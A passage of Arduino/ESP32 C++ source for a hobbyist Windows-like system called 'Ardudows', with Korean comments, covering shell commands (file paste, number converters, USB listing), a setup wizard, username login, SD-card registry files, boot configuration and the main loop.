    File src = SD.open(clipPath.c_str(), FILE_READ);
    File dst = SD.open(destPath.c_str(), FILE_WRITE);

    if (src && dst) {
      uint8_t buf[128]; // 128바이트씩 바구니에 담아서 나름 (속도 최적화)
      while (src.available()) {
        size_t len = src.read(buf, sizeof(buf));
        dst.write(buf, len);
      }
      dst.close();
      src.close();
      tft.println(" [DONE]");

      // 4. 잘라내기(CUT) 모드였다면 원본 삭제 (Purge!)
      if (clipIsCut) {
        if (SD.remove(clipPath.c_str())) {
          tft.println("Original file purged (Move complete).");
        }
        clipPath = ""; // 잘라내기 완료 후 클립보드 비우기
        }
    } else {
      tft.println(" [IO ERROR]");
      if (dst) dst.close();
      if (src) src.close();
    }
  }

  // --- [ CONVERTER ] ---

  else if (cmd.startsWith("hex ")) {

    String v = cmd.substring(4);
    v.replace("0x", "");

    int n = strtol(v.c_str(), 0, 16);

    tft.println(">> HEX CONVERTER");
    tft.printf("HEX   : 0x%X\n", n);
    tft.printf("DEC   : %d\n", n);
    tft.printf("BIN   : %s\n", String(n, BIN).c_str());
    tft.printf("ASCII : %c\n", (char)n);
  }

  else if (cmd.startsWith("dec ")) {

    int n = cmd.substring(4).toInt();

    tft.println(">> DEC CONVERTER");
    tft.printf("DEC   : %d\n", n);
    tft.printf("HEX   : 0x%X\n", n);
    tft.printf("BIN   : %s\n", String(n, BIN).c_str());
    tft.printf("ASCII : %c\n", (char)n);
  }

  else if (cmd.startsWith("bin ")) {

    String v = cmd.substring(4);

    int n = strtol(v.c_str(), 0, 2);

    tft.println(">> BIN CONVERTER");
    tft.printf("BIN   : %s\n", v.c_str());
    tft.printf("DEC   : %d\n", n);
    tft.printf("HEX   : 0x%X\n", n);
    tft.printf("ASCII : %c\n", (char)n);
  }

  else if (cmd.startsWith("ascii ")) {

    String txt = cmd.substring(6);

    tft.println(">> ASCII CONVERTER");

    for (int i = 0; i < txt.length(); i++) {

      int n = txt[i];

      tft.printf(
        "'%c' = DEC:%d HEX:0x%X BIN:%s\n",
        txt[i],
        n,
        n,
        String(n, BIN).c_str()
      );
    }
  }

  else if (cmd == "dvd") {

    tft.println(">> STARTING DVD MODE");
    delay(1000);

    dvdMode();
  }

  // ================= [ USB KERNEL LINKER ] =================
  // 형님의 USB 60대 기능을 ATK 셸에 연결하는 핵심 링커입니다.
  
  else if (cmd.startsWith("usb ")) {
    String sub = cmd.substring(4);
    sub.trim();

    if (sub.length() == 0) {
        tft.setTextColor(TFT_YELLOW);
        tft.println(">> USB KERNEL USAGE:");
        tft.setTextColor(TFT_WHITE);
        tft.println(" usb init          : Initialize Stack");
        tft.println(" usb status        : Show HW/VBUS Status");
        tft.println(" usb host <cmd>    : Host Mode (scan, info..)");
        tft.println(" usb device <cmd>  : Device Mode (type, script..)");
        tft.println(" usb reset         : Hardware Reconnect");
    } else {
        // [UI 알림] USB 명령 실행 시 시각적 피드백
        tft.setTextColor(TFT_CYAN);
        tft.print(">> USB_EXE: ");
        tft.setTextColor(TFT_WHITE);
        tft.println(sub);
        
        // 아까 만든 60기능 엔진 호출!
        cmd_usb(cmd); 
    }
    tft.setTextColor(TFT_GREEN);
  }

  // USB 전용 프로세스 모니터 (top의 확장판)
  else if (cmd == "lsusb") {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.setTextColor(TFT_YELLOW);
    tft.println("[ ARDUDOWS USB DEVICE LIST ]");
    tft.println("----------------------------");
    tft.setTextColor(TFT_WHITE);
    
    if (!usb_h_ready) {
        tft.setTextColor(TFT_RED);
        tft.println("Error: Host Driver Not Initialized");
    } else {
        // 호스트 스캔 함수 호출 및 결과를 TFT에 출력
        usb_h_scan(); 
        tft.printf("Connected Devices: %d\n", usb_h_count());
        tft.printf("VBUS Voltage: %.2f V\n", usb_vbus_get());
        tft.printf("Bus Speed: %s\n", usb_speed());
    }
    tft.println("----------------------------");
    tft.setTextColor(TFT_GREEN);
  }

  // --- [ UNKNOWN ] ---
  else {
    tft.print("Unknown command: ");
    tft.println(cmd);
  }
}

//===사용자 폴더 수정===
void RenameUserFolder(String newUser) {

  if (newUser.length() == 0) return;

  // 기존 경로
  String oldPath = "/Ardudows/Users/Administrator";
  String newPath = "/Ardudows/Users/" + newUser;

  // 새 폴더 생성
  SD.mkdir(newPath);

  // UserDATA 이동
  String oldData = oldPath + "/UserDATA.auf";
  String newData = newPath + "/UserDATA.auf";

  if (SD.exists(oldData)) {
    File oldFile = SD.open(oldData);
    File newFile = SD.open(newData, FILE_WRITE);

    while (oldFile.available()) {
      newFile.write(oldFile.read());
    }

    oldFile.close();
    newFile.close();
  }

  // 기존 Administrator 폴더 삭제
  SD.rmdir(oldPath);

  currentUser = newUser;
}

void AUIC_HandleArrow(uint8_t key) {
  if (auicStep == AUIC_COUNTRY) {
    if (key == KEY_LEFT || key == KEY_UP) {
      countryIndex--;
      if (countryIndex < 0)
        countryIndex = countryCount - 1;
    }

    if (key == KEY_RIGHT || key == KEY_DOWN) {
      countryIndex++;
      if (countryIndex >= countryCount)
        countryIndex = 0;
    }

    auicCountry = countryList[countryIndex];
    auicDrawn = false;
  }

  if (auicStep == AUIC_AUTHORITY) {
    static const char* authList[] = {
      "Administrator",
      "User",
      "Guest"
    };

    static int authIndex = 0;

    if (key == KEY_LEFT || key == KEY_UP) {
      authIndex--;
      if (authIndex < 0)
        authIndex = 2;
    }

    if (key == KEY_RIGHT || key == KEY_DOWN) {
      authIndex++;
      if (authIndex > 2)
        authIndex = 0;
    }

    auicAuthority = authList[authIndex];
    auicDrawn = false;
  }
}

void HandleInstallEnter() {

  switch (installStage) {

    // -------------------------
    // 1️⃣ Welcome → License
    // -------------------------
    case INST_WELCOME:
      installStage = INST_LICENSE;
      installDrawn = false;
      break;


    // -------------------------
    // 2️⃣ License → Copying
    // -------------------------
    case INST_LICENSE:

      if (inputBuffer == "YES") {

        tft.fillScreen(TFT_BLACK);
        tft.setCursor(0, 0);
        tft.println("Installing...");
        tft.println();

        installStage = INST_COPYING;

        ArduInstaller();  // 🔥 실제 파일 생성

        installStage = INST_DONE;
      } else {
        tft.println();
        tft.println("Type YES to accept license.");
      }

      inputBuffer = "";
      break;


    // -------------------------
    // 3️⃣ Copying → Done
    // -------------------------
    case INST_COPYING:
      // 보통 여기 안 들어옴 (위에서 바로 DONE으로 감)
      break;


    // -------------------------
    // 4️⃣ Done → AUIC
    // -------------------------
    case INST_DONE:

      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0, 0);
      tft.println("Rebooting...");
      delay(1000);

      bootState = BOOT_AUIC;
      auicDrawn = false;

      break;
  }
}

void AUIC_SaveUser() {

  String sectionName = "USER_" + newUsername;

  Registry_Set(sectionName.c_str(), "USERNAME", newUsername.c_str());
  Registry_Set(sectionName.c_str(), "PASSWORD", newPassword.c_str());
  Registry_Set(sectionName.c_str(), "WORKGROUP", newWorkgroup.c_str());
  Registry_Set(sectionName.c_str(), "TYPE", newAccountType.c_str());

  Registry_Save();

  SaveRegistryToFile();  // 🔥 SD에 저장
}

void SaveRegistryToFile() {

  SD.mkdir("/Registry");

  File file = SD.open("/Ardudows/System/Registry/User.asf", FILE_WRITE);
  if (!file) return;

  for (int i = 0; i < registry_count; i++) {

    file.print("[");
    file.print(registry[i].section);
    file.println("]");

    for (int j = 0; j < registry[i].key_count; j++) {
      file.print(registry[i].keys[j].key);
      file.print("=");
      file.println(registry[i].keys[j].value);
    }

    file.println();
  }

  file.close();
}

void LoadRegistryFromFile() {

  if (!SD.exists("/Registry/User.asf")) return;

  File file = SD.open("/Registry/User.asf");

  String line;
  String currentSection;

  while (file.available()) {

    line = file.readStringUntil('\n');
    line.trim();

    if (line.startsWith("[") && line.endsWith("]")) {
      currentSection = line.substring(1, line.length() - 1);
      Registry_Make_Item(currentSection.c_str());
    } else if (line.indexOf("=") != -1) {

      int eq = line.indexOf("=");

      String key = line.substring(0, eq);
      String value = line.substring(eq + 1);

      Registry_Set(currentSection.c_str(),
                   key.c_str(),
                   value.c_str());
    }
  }

  file.close();
}

void AUIC_AddChar(char c) {
  auicEditBuffer += c;
  AUIC_SaveCurrentField();
  auicDrawn = false;
}

void AUIC_Backspace() {
  if (auicEditBuffer.length() > 0) {
    auicEditBuffer.remove(auicEditBuffer.length() - 1);
  }

  AUIC_SaveCurrentField();
  auicDrawn = false;
}

void DrawLoginScreen() {
  tft.fillScreen(TFT_BLACK);

  tft.setCursor(20, 40);
  tft.print("Ardudows");

  tft.setCursor(20, 100);
  tft.print("User: ");

  loginDrawn = true;
}

void AUIC_Finish() {
  // 기존 Registry 삭제
  SD.remove("/Ardudows/System/Registry/User.asf");

  File f = SD.open("/Ardudows/System/Registry/User.asf", FILE_WRITE);

  if (f) {
    f.println("Username=" + auicUsername);
    f.println("Password=" + auicPassword);
    f.println("Authority=" + auicAuthority);
    f.close();
  }

  // System Registry
  SD.remove("/Ardudows/System/Registry/System.asf");

  File sys = SD.open("/Ardudows/System/Registry/System.asf", FILE_WRITE);

  if (sys) {
    sys.println("ComputerName=" + auicComputerName);
    sys.close();
  }

  // Setup Registry
  SD.remove("/Ardudows/System/Registry/Setup.asf");

  File setup = SD.open("/Ardudows/System/Registry/Setup.asf", FILE_WRITE);

  if (setup) {
    setup.println("AUICComplete=1");
    setup.close();
  }

  // 사용자 폴더 이름 변경
  SD.rename(
    "/Ardudows/Users/Administrator",
    ("/Ardudows/Users/" + auicUsername).c_str());

  CreateFile("/Ardudows/System/AUIC.aof", "done");

  Serial.println("AUIC Finished clean");
}

bool IsAUICComplete() {
  const char* value = Registry_Get("Setup", "AUICComplete");

  if (value == NULL)
    return false;

  if (strcmp(value, "1") == 0)
    return true;

  return false;
}

bool IsAUICDone() {
  const char* value = Registry_Get("System", "AUIC_DONE");

  if (value && strcmp(value, "true") == 0)
    return true;

  return false;
}

void Ardudows_HandleInput(uint8_t key) {
  if (bootState != BOOT_AUIC) return;

  if (key == KEY_NONE) return;

  // 화살표
  if (key >= KEY_UP && key <= KEY_RIGHT) {
    AUIC_HandleArrow(key);
    return;
  }

  switch (key) {
    case KEY_F2:
    case KEY_ENTER:
      AUIC_SaveCurrentField();
      auicStep = (AUIC_STEP)((int)auicStep + 1);
      AUIC_LoadCurrentField();
      auicDrawn = false;
      break;

    case KEY_F1:
      if (auicStep > 0) {
        AUIC_SaveCurrentField();
        auicStep = (AUIC_STEP)((int)auicStep - 1);
        AUIC_LoadCurrentField();
        auicDrawn = false;
      }
      break;

    case KEY_BACKSPACE:
      AUIC_Backspace();
      break;

    default:
      if (key >= 32 && key <= 126) {
        AUIC_AddChar((char)key);
      }
      break;
  }
}

void LoginLoop() {
  uint8_t key = ps2Keyboard_adf();

  if (key == KEY_NONE) return;

  if (key == KEY_ENTER) {
    currentUser = loginUser;
    bootState = BOOT_KERNEL;
    loginDrawn = false;
    return;
  }

  if (key == KEY_BACKSPACE) {
    if (loginUser.length() > 0) {
      loginUser.remove(loginUser.length() - 1);

      tft.fillRect(0, 20, 320, 20, TFT_BLACK);
      tft.setCursor(0, 20);
      tft.print("User: " + loginUser);
    }
    return;
  }

  if (key >= 32 && key <= 126) {
    loginUser += (char)key;
    tft.print((char)key);
  }
}

//volatile uint8_t lastKey = KEY_NONE;



void Ardudows_StateMachine() {
  // 키는 무조건 한 번만 읽는다
  char key = Keyboard_GetKey();

  switch (bootState) {

    // ==================================================
    // AUIC
    // ==================================================
    case BOOT_AUIC:
      {
        // 화면 처음 그리기
        if (!auicDrawn) {
          AUIC_LoadCurrentField();  // 현재 단계 버퍼 로드
          AUIC_Draw();
          auicDrawn = true;
        }

        // 입력 처리
        if (key != KEY_NONE) {
          // 다음 단계
          if (key == KEY_F2 || key == KEY_ENTER) {
            AUIC_SaveCurrentField();

            if (auicStep < AUIC_DONE) {
              auicStep = (AUIC_STEP)((int)auicStep + 1);
              AUIC_LoadCurrentField();
              auicDrawn = false;
            } else {
              // AUIC 완료 → LOGIN 이동
              //AUIC_Finish();
              bootState = BOOT_LOGIN;
              loginDrawn = false;
            }
          }

          // 이전 단계
          else if (key == KEY_F1) {
            if (auicStep > AUIC_WELCOME) {
              AUIC_SaveCurrentField();

              auicStep = (AUIC_STEP)((int)auicStep - 1);

              AUIC_LoadCurrentField();
              auicDrawn = false;
            }
          }

          // 백스페이스
          else if (key == KEY_BACKSPACE) {
            if (auicEditBuffer.length() > 0) {
              auicEditBuffer.remove(auicEditBuffer.length() - 1);
              AUIC_SaveCurrentField();
              auicDrawn = false;
            }
          }

          // 화살표
          else if (
            key == KEY_UP || key == KEY_DOWN || key == KEY_LEFT || key == KEY_RIGHT) {
            AUIC_HandleArrow(key);
            auicDrawn = false;
          }

          // 문자 입력
          else if (key >= 32 && key <= 126) {
            auicEditBuffer += key;
            AUIC_SaveCurrentField();
            auicDrawn = false;
          }
        }

        break;
      }


    // ==================================================
    // LOGIN
    // ==================================================
    case BOOT_LOGIN:
      {
        if (!loginDrawn) {
          tft.fillScreen(TFT_BLACK);

          tft.setCursor(20, 40);
          tft.print("Ardudows");

          tft.setCursor(20, 100);
          tft.print("User: ");

          correctUser = Registry_Read_Value(
            "/Ardudows/System/Registry/User.asf",
            "Username");

          loginInput = "";

          loginDrawn = true;
        }

        if (key != KEY_NONE) {
          if (key == KEY_ENTER) {
            tft.println();

            if (loginInput == correctUser) {
              tft.println("Welcome " + loginInput);

              currentUser = loginInput;

              currentPath = ROOT_PATH + "/Users/" + currentUser;

              bootState = BOOT_KERNEL;
              atkStarted = false;
            } else {
              tft.println("Invalid user!");
              tft.print("User: ");
              loginInput = "";
            }
          }

          else if (key == KEY_BACKSPACE) {
            if (loginInput.length() > 0) {
              loginInput.remove(loginInput.length() - 1);
              tft.print("\b \b");
            }
          }

          else if (key >= 32 && key <= 126) {
            loginInput += key;
            tft.print(key);
          }
        }

        break;
      }


    // ==================================================
    // KERNEL
    // ==================================================
    case BOOT_KERNEL:
      {
        if (!atkStarted) {
          tft.fillScreen(TFT_BLACK);
          tft.setTextSize(2);
          ATK_Setup();
          atkInput = "";

          // 이 한 줄만 조건문으로 감싸세요
          if (!g_isHackerRunning) { 
            tft.print(currentUser); tft.print("@ATK "); tft.print(currentPath); tft.print("> ");
          }
  
          atkStarted = true;
        }

        if (key != KEY_NONE) {
          if (key == KEY_ENTER) {
            tft.println();
  
            if (g_isHackerRunning) {
              Process_Who_is_Hacker(atkInput); // 게임 진행
            } else {
              executeCommand(atkInput); // 일반 명령어
            }

            atkInput = ""; // 버퍼 비우기

            // 게임 중이 아닐 때만 프롬프트 다시 그리기
            if (!g_isHackerRunning) {
              tft.print(currentUser);
              tft.print("@ATK ");
              tft.print(currentPath);
              tft.print("> ");
            }
          }

          else if (key == KEY_BACKSPACE) {
            if (atkInput.length() > 0) {
              atkInput.remove(atkInput.length() - 1);
              tft.print("\b \b");
            }
          }

          else if (key >= 32 && key <= 126) {
            atkInput += key;
            tft.print(key);
          }
        }

        break;
      }
  }
}

void CheckLogin() {

  String sectionName = "USER_" + loginUser;

  const char* savedPw =
    Registry_Get(sectionName.c_str(), "PASSWORD");

  if (savedPw && loginPassword == String(savedPw)) {

    currentUser = loginUser;

    tft.println();
    tft.println("Welcome " + currentUser);

    delay(1000);

    bootState = BOOT_KERNEL;
  } else {

    tft.println();
    tft.println("Wrong password.");
    tft.print("Password : ");
  }

  loginPassword = "";
}

//===부트로더===
bool Boot_abf() {
  File f;

  // Boot.abf 없으면 생성
  if (!SD.exists("/Ardudows/System/Boot/Boot.abf")) {
    f = SD.open("/Ardudows/System/Boot/Boot.abf", FILE_WRITE);

    if (!f) return false;

    f.println("kernel=ATK");
    f.println("bootlogo=true");
    f.println("autologin=false");
    f.println("safemode=false");
    f.println("lastuser=Administrator");
    f.println("bootcount=0");

    f.close();
  }

  // 읽기
  f = SD.open("/Ardudows/System/Boot/Boot.abf");

  if (!f) return false;

  while (f.available()) {
    String line = f.readStringUntil('\n');

    line.trim();

    if (line.startsWith("kernel="))
      Boot_Kernel = line.substring(7);

    else if (line.startsWith("bootlogo="))
      Boot_Logo = line.substring(9) == "true";

    else if (line.startsWith("autologin="))
      Boot_AutoLogin = line.substring(10) == "true";

    else if (line.startsWith("safemode="))
      Boot_SafeMode = line.substring(9) == "true";

    else if (line.startsWith("lastuser="))
      Boot_LastUser = line.substring(9);

    else if (line.startsWith("bootcount="))
      Boot_Count = line.substring(10).toInt();
  }

  f.close();

  // bootcount 증가
  Boot_Count++;

  // 다시 저장
  f = SD.open("/Ardudows/System/Boot/Boot.abf", FILE_WRITE);

  if (f) {
    f.println("kernel=" + Boot_Kernel);
    f.println("bootlogo=" + String(Boot_Logo ? "true" : "false"));
    f.println("autologin=" + String(Boot_AutoLogin ? "true" : "false"));
    f.println("safemode=" + String(Boot_SafeMode ? "true" : "false"));
    f.println("lastuser=" + Boot_LastUser);
    f.println("bootcount=" + String(Boot_Count));

    f.close();
  }

  // BootState 결정
  if (Boot_SafeMode) {
    bootState = BOOT_RECOVERY;
  } else if (Boot_Logo) {
    bootState = BOOT_KERNEL;
  } else if (Boot_AutoLogin) {
    currentUser = Boot_LastUser;
    bootState = BOOT_LOGIN;
  } else {
    bootState = BOOT_LOGIN;
  }

  return true;
}

// 221-서버에서 다시 Ardudows 데스크탑으로 복귀하는 함수
void GoArdudows() {
  Serial.println(">>> [SYSTEM] Ardudows(app0) 복귀 시퀀스 시작...");

  // 1. app0 (Ardudows가 설치된 첫 번째 파티션) 찾기
  const esp_partition_t* boot_partition = esp_partition_find_first(
    ESP_PARTITION_TYPE_APP, 
    ESP_PARTITION_SUBTYPE_APP_OTA_0, 
    NULL
  );

  if (boot_partition != NULL) {
    // 2. 부팅 우선순위를 app0으로 변경
    esp_err_t err = esp_ota_set_boot_partition(boot_partition);
    
    if (err == ESP_OK) {
      Serial.println(">>> [SUCCESS] 부팅 파티션 변경 완료. 3초 후 재부팅합니다.");
      delay(3000);
      esp_restart(); // 칩 초기화 및 재시작
    } else {
      Serial.printf(">>> [ERROR] 파티션 설정 실패! 에러 코드: %d\n", err);
    }
  } else {
    Serial.println(">>> [ERROR] Ardudows 파티션을 찾을 수 없습니다.");
  }
}

//===아주 귀찮은 setup문===
void setup() {
  Serial.begin(115200);

  pinMode(CLK_PIN, INPUT_PULLUP);
  pinMode(DATA_PIN, INPUT_PULLUP);
  pinMode(12, OUTPUT);

  attachInterrupt(digitalPinToInterrupt(CLK_PIN), host_isr, FALLING);

  Serial.println("\nKeyboard Ready!");

  pinMode(0, INPUT_PULLUP);
  
  // 만약 라우터 실행 중에 다시 돌아오고 싶을 때 버튼을 누른다면?
  // (이 로직은 '라우터용 바이너리'를 직접 수정할 수 있을 때 유효해)
  if (digitalRead(0) == LOW) {
    GoArdudows(); 
  }

  // =========================
  // Core init
  // =========================

  ASRaS_Core();
  ASS_Init();

  SD_OK = ASRaS_DeviceInit();


  // =========================
  // SD 없음 → Recovery
  // =========================

  if (!SD_OK) {
    Serial.println("SD not detected → Recovery mode");

    bootState = BOOT_RECOVERY;
    ArduBios();
    return;
  }

  // =========================
  // 부트로더
  // =========================

  Boot_abf();


  // =========================
  // Install 확인
  // =========================

  install_aif_Parser();

  if (!install) {
    Serial.println("Ardudows not installed → Install mode");

    bootState = BOOT_INSTALL;
    ArduBios();
    return;
  }


  // =========================
  // AUIC 완료 여부 확인
  // =========================

  if (SD.exists("/Ardudows/System/AUIC.aof")) {
    Serial.println("AUIC already completed.");

    bootState = BOOT_LOGIN;
  } else {
    Serial.println("AUIC required.");

    bootState = BOOT_AUIC;
  }


  // =========================
  // BIOS 시작
  // =========================

  ArduBios();
  //initRTC();
  bootTime = millis();
}

//===이제 시작이다 loop문===
unsigned long lastNetTick = 0;  // 네트워크 처리 타이머

void loop() {
  // 1. 키보드는 무조건 최우선! 매 루프마다 체크
  Keyboard_Update();
  Ardudows_StateMachine();

  // 2. 네트워크 처리는 약 50ms(0.05초)마다 한 번씩만 수행 (키보드 씹힘 방지)
  unsigned long currentMillis = millis();
  if (currentMillis - lastNetTick >= 50) {
    lastNetTick = currentMillis;

    // 릭롤 작전 중일 때만 DNS 처리
    if (isRickrollActive) {
      dnsServer.processNextRequest();
    }

    // 웹 서버는 주기적으로만 확인해도 충분함
    webServer.handleClient();
  }

  // 3. [여기가 핵심] USB 업데이트 격리
  static uint32_t last_usb_u = 0;
  if (usb_h_ready && (currentMillis - last_usb_u >= 50)) { // 5ms 마다 실행
    last_usb_u = currentMillis;
    usb_update(); 
    Keyboard_Update(); // USB가 휘젓고 간 직후에 바로 다시 체크
  }

  // 2. 백그라운드 USB 상태 모니터링 (선택 사항이지만 권장)
  static uint32_t last_usb_tick = 0;
  if (millis() - last_usb_tick > 1000) { // 1초마다 체크
    last_usb_tick = millis();

    // VBUS 전압이 너무 낮으면 경고 (VBUS 센싱 핀 사용 시)
    if (usb_vbus_get() < 4.5 && usb_vbus_get() > 1.0) {
      // tft.setTextColor(TFT_RED);
      // tft.println("[WARN] Low VBUS Voltage!");
    }

    // 장치 연결/해제 실시간 감지 (count가 변하면 자동 알림)
    static int last_count = 0;
    int current_count = usb_h_count();
    if (current_count != last_count) {
      Serial.printf("[SYSTEM] USB Device Count Changed: %d -> %d\n", last_count, current_count);
      last_count = current_count;
    }
  }
  //vga_refresh(vga_state, my_vga_redraw, NULL, 1);
  // 1. VGA 연산을 잠시 줄이고
  // 2. 화면 전송 함수를 무조건 실행
  //tft.startWrite(); // 전송 시작 선언 (권장)
  //vga_refresh(vga_state, my_vga_redraw, NULL, 1);
  //tft.endWrite();   // 전송 종료

  //delay(10); // CPU가 숨 쉴 틈을 줍니다.
  yield();
}
